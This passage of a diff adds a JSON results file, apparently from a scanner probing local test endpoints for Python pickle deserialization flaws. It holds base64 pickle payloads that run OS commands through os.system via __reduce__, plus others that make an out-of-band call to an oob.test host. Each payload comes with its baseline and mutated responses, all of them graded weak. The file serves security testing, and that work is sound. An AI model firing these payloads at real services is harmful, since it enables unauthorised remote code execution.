+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_oob",
+                    "chain": "urllib.urlopen via __reduce__",
+                    "payload": "gAWVQgAAAAAAAACMDnVybGxpYi5yZXF1ZXN0lIwHdXJsb3BlbpSTlIwdaHR0cDovLzBjMGFmZTQ1MjUzOC5vb2IudGVzdC+UhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8083/api/import-config",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "ffdba56acc4a",
+            "type": "Python Pickle",
+            "subtype": null,
+            "confidence": "High",
+            "exploit_type": "Python Pickle RCE",
+            "suggested_probe": "pickle_exec",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+            "normalized": [
+                "\u00048\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0006models\u0004User)}(\busername\u0006wiener\u0005adminub."
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"config\":\"<models.Settings object at 0x72ff92c85f50>\",\"success\":true}\\n' mutated='{\"config\":\"<models.Settings object at 0x72ff92c99650>\",\"success\":true}\\n')",
+                "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.94) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"config\":\"<models.Settings object at 0x72ff92c85f50>\",\"success\":true}\\n' mutated='{\"config\":\"<models.Settings object at 0x72ff92c99650>\",\"success\":true}\\n')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.94) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff92c85f50>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff92c99650>\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<models.Settings object at 0x72ff9226eb90>\",\"success\":true}\\n' mutated='{\"config\":\"<models.Settings object at 0x72ff9226d790>\",\"success\":true}\\n')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226eb90>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226d790>\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<models.Settings object at 0x72ff9226da90>\",\"success\":true}\\n' mutated='{\"config\":\"<models.Settings object at 0x72ff9226e490>\",\"success\":true}\\n')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.96) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226da90>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226e490>\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_oob",
+                    "chain": "urllib.urlopen via __reduce__",
+                    "payload": "gAWVQgAAAAAAAACMDnVybGxpYi5yZXF1ZXN0lIwHdXJsb3BlbpSTlIwdaHR0cDovL2ZmZGJhNTZhY2M0YS5vb2IudGVzdC+UhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"config\":\"<models.Settings object at 0x72ff9226e490>\",\"success\":true}\\n' mutated='{\"config\":\"<models.Settings object at 0x72ff9226df50>\",\"success\":true}\\n')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226e490>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226df50>\",\"success\":true}\n"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8083/api/restore-prefs",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "84a297791016",
+            "type": "Python Pickle",
+            "subtype": null,
+            "confidence": "High",
+            "exploit_type": "Python Pickle RCE",
+            "suggested_probe": "pickle_exec",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+            "normalized": [
+                "\u00048\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0006models\u0004User)}(\busername\u0006wiener\u0005adminub."
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<models.Preferences object at 0x72ff9226e450>\",\"success\":true}\\n' mutated='{\"restored\":\"<models.Preferences object at 0x72ff9226eb90>\",\"success\":true}\\n')",
+                "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<models.Preferences object at 0x72ff9226e450>\",\"success\":true}\\n' mutated='{\"restored\":\"<models.Preferences object at 0x72ff9226eb90>\",\"success\":true}\\n')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226e450>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226eb90>\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<models.Preferences object at 0x72ff9226e310>\",\"success\":true}\\n' mutated='{\"restored\":\"<models.Preferences object at 0x72ff9226f410>\",\"success\":true}\\n')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226e310>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226f410>\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<models.Preferences object at 0x72ff9226ef10>\",\"success\":true}\\n' mutated='{\"restored\":\"<models.Preferences object at 0x72ff9226ed90>\",\"success\":true}\\n')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226ef10>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226ed90>\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_oob",
+                    "chain": "urllib.urlopen via __reduce__",
+                    "payload": "gAWVQgAAAAAAAACMDnVybGxpYi5yZXF1ZXN0lIwHdXJsb3BlbpSTlIwdaHR0cDovLzg0YTI5Nzc5MTAxNi5vb2IudGVzdC+UhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response content differs in a small, localized way despite same status (similarity=0.99) (baseline='{\"restored\":\"<models.Preferences object at 0x72ff9226df50>\",\"success\":true}\\n' mutated='{\"restored\":\"<models.Preferences object at 0x72ff9226df10>\",\"success\":true}\\n')",
+                        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226df50>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226df10>\",\"success\":true}\n"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8083/api/import-async",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "937d6db29876",
+            "type": "Python Pickle",
+            "subtype": null,
+            "confidence": "High",
+            "exploit_type": "Python Pickle RCE",
+            "suggested_probe": "pickle_exec",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+            "normalized": [
+                "\u00048\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0006models\u0004User)}(\busername\u0006wiener\u0005adminub."
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_oob",
+                    "chain": "urllib.urlopen via __reduce__",
+                    "payload": "gAWVQgAAAAAAAACMDnVybGxpYi5yZXF1ZXN0lIwHdXJsb3BlbpSTlIwdaHR0cDovLzkzN2Q2ZGIyOTg3Ni5vb2IudGVzdC+UhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    }
+                }
+            ]
+        }
+    ]
+}
